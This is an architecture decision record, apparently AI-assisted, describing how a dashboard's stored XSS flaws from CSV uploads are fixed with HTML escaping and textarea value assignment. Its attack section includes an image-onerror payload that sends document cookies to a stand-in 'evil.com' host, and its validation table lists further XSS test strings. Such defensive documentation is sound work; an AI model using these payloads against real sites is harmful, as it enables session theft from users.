# ADR-017 — Frontend XSS Mitigation: escapeHtml + Textarea Value Assignment

| Field          | Value                                      |
|----------------|--------------------------------------------|
| **Status**     | Accepted                                   |
| **Date**       | 2026-03-06                                 |
| **Author**     | AI-assisted (Claude Code)                  |
| **Supersedes** | —                                          |
| **OWASP**      | A03:2021 — Injection (Stored XSS)          |
| **CLAUDE.md**  | §10 (Security), §11 (AI/Agentic Security)  |

---

## Context

The web dashboard (`services/web-dashboard/js/app.js`) renders server-returned data
directly into the DOM using `innerHTML` string interpolation without HTML-escaping user-
controlled values.  This creates three stored XSS attack vectors:

**F-04 — Agent logs** (`app.js` logs terminal):
```javascript
// VULNERABLE: 'l' contains server log strings derived from CSV Description fields
logsEl.innerHTML = logs.map(l => `<div>${l}</div>`).join('');
```

**F-05 — Requirements table** (`app.js` requirements list):
```javascript
// VULNERABLE: r.req_id, r.source_system, r.target_system, r.category, r.description
// all come directly from the user-uploaded CSV file
`<td><code>${r.req_id}</code></td>`
```

**F-06 — Approval editor textarea** (`app.js` HITL approvals):
```javascript
// VULNERABLE: item.content injected into innerHTML; a '</textarea>' in the
// value breaks out of the textarea element
`<textarea ...>${item.content}</textarea>`
```

### Attack Vector

1. Attacker crafts a CSV file with a `Description` field containing:
   `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">`
2. Victim uploads the CSV via the dashboard.
3. Backend stores the description as-is (the XSS guard in `output_guard.py` only
   runs on LLM-generated output, not on raw CSV fields).
4. Dashboard renders the requirements table with `innerHTML` → script executes.

The backend bleach sanitization (ADR-015) does NOT protect against this because it
is applied to LLM output, not to raw user CSV data served back to the frontend.

---

## Decision

Apply HTML-escaping in the browser at every point where server-supplied data is
injected into the DOM via `innerHTML`.

### Implementation

**1. Add `escapeHtml()` utility function** (single source of truth, no dependencies):
```javascript
function escapeHtml(str) {
    if (str === null || str === undefined) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}
```
Covers the OWASP-recommended five entities: `& < > " '`.

**2. Escape all server-sourced values** injected into `innerHTML` template literals.

**3. Textarea content via `.value` assignment** (not innerHTML interpolation):
```javascript
// Create the textarea element without content in innerHTML
editor.innerHTML = `<textarea id="hitlMarkdown" ...></textarea>`;
// Then set content via the .value DOM property — immune to </textarea> injection
document.getElementById('hitlMarkdown').value = item.content;
```
This is the safest pattern for textarea content because it sets the value as text,
not as HTML, regardless of what the content contains.

---

## Alternatives Considered

| Alternative | Reason Rejected |
|------------|-----------------|
| **DOMPurify library** | Adds a CDN dependency; `escapeHtml()` is sufficient for our use case (we need escaping, not full sanitization) |
| **Content Security Policy (CSP) headers** | Complementary but not a substitute — CSP does not prevent DOM XSS when `innerHTML` is used with user data; also requires Nginx config changes |
| **Use `textContent` everywhere** | Cannot use `textContent` to build structured HTML (tables, badges); would require full DOM API rewrite |
| **Server-side pre-escaping** | Violates separation of concerns; the backend should return raw data, the frontend is responsible for safe rendering |

---

## Consequences

### Positive
- Eliminates three confirmed stored XSS vectors (F-04, F-05, F-06)
- Zero external dependencies added
- `escapeHtml()` is reusable for any future data rendering
- Textarea content reliably set via DOM API regardless of content

### Negative
- `escapeHtml()` must be applied consistently — new code must follow the same pattern
  (enforced by code review checklist)
- HTML entities (`&amp;`, `&lt;`) appear correctly in the browser but look noisy in
  raw HTML source (acceptable trade-off)

---

## Validation Plan

| Test ID | Scenario | Expected |
|---------|----------|----------|
| XSS-FE-001 | Upload CSV with `<script>alert(1)</script>` in Description | Requirements table shows literal `<script>` text, no alert |
| XSS-FE-002 | Upload CSV with `<img src=x onerror=alert(1)>` in Source | Badge shows literal text, no alert |
| XSS-FE-003 | Approve content containing `</textarea><script>evil()</script>` | Textarea shows literal text, no script execution |
| XSS-FE-004 | Agent log with injected `<b>bold</b>` | Log terminal shows `&lt;b&gt;bold&lt;/b&gt;`, not formatted bold |

Manual tests via browser DevTools; automated E2E tests are out of scope for PoC.

---

## Rollback Strategy

Revert `app.js` to the prior commit.  No backend changes, no data migrations, no
downtime.  Risk: LOW (pure frontend change, no API contract changes).

---

## OWASP Mapping

| Risk | Mitigation |
|------|-----------|
| A03 — Stored XSS via CSV upload | `escapeHtml()` on all innerHTML injections |
| A03 — Stored XSS via approval editor | `.value` assignment for textarea content |
| A05 — Missing security headers (CSP) | Documented as future improvement (F-18) |
